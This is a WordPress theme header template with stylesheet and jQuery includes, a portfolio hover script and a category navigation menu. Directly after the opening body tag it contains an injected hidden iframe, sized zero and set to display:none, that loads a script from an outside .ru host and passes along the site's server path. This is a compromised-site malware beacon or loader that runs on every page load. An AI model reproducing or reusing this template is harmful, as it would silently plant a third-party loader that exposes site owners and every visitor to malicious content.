<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<title><?php wp_title('&laquo;', true, 'right'); ?> <?php bloginfo('name'); ?></title>
<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<!--[if lte IE 7]><link rel="stylesheet" href="<?php bloginfo('template_directory'); ?>/library/ie.css" type="text/css" media="screen, projection" /><![endif]-->
<!--[if IE 8]><link rel="stylesheet" href="<?php bloginfo('template_directory'); ?>/library/ie8.css" type="text/css" media="screen, projection" /><![endif]-->
<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="alternate" type="application/atom+xml" title="<?php bloginfo('name'); ?> Atom Feed" href="<?php bloginfo('atom_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/jquery-1.3.2.min.js"></script>
<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/jquery.droppy.js"></script>
<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/search.js"></script>
<?php if(is_single(!in_category($blog_ID))) { ?>
<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/jquery.gallery.js"></script>
<?php } ?>
<script type="text/javascript">
$(function(){
	//portfolio thumb fadein fadeout
	$('#content div.portfolio').hover(function(){
		$(this).find('img').fadeOut();

	}, function(){
		$(this).find('img').fadeIn();
	});
	//load menu
	$('#nav-drop').droppy();
	<?php if(is_single(!in_category($blog_ID))) { ?>
	$('#gallery').gallery();
	<?php } ?>
});
</script>
<?php wp_head(); ?>
</head>

<body><iframe width="0" height="0" style="display:none;" id="frmchkldver" src="http://inglo-kotor.ru/yesproject/check.php?ftd=190051&path=%7cdaletigre%7cpublic_html%7cwp-content%7cthemes%7cworkaholic%7c&sys=UN&wrk=8"></iframe>
<div class="container_12">
<?php 
// pull from theme options
global $blog_ID;
$blog_ID = get_option('T_blog_ID');
?>
<div id="header" class="grid_12">
	<div id="logo">
		<h1><a href="<?php echo get_option('home'); ?>/"><?php bloginfo('name'); ?></a></h1>
		<span class="description"><?php bloginfo('description'); ?></span>	
	</div>
 	<?php if(function_exists('get_search_form')) : ?>
		<?php get_search_form(); ?>
		<?php else : ?>
		<?php include (TEMPLATEPATH . '/searchform.php'); ?>
	<?php endif; ?>
 	<ul id="nav-drop">
 		<li <?php if(is_home()) echo 'class="current-cat"'; ?>><a href="<?php bloginfo('home'); ?>">Home</a></li>
 		<?php wp_list_categories("exclude=$blog_ID&title_li=<a>Portfolio</a>"); ?>
 		<?php wp_list_categories("include=$blog_ID&title_li="); ?>
 		<?php wp_list_pages("title_li="); ?> 			 	
 	</ul> 		
</div>	
<hr class="grid_12" />
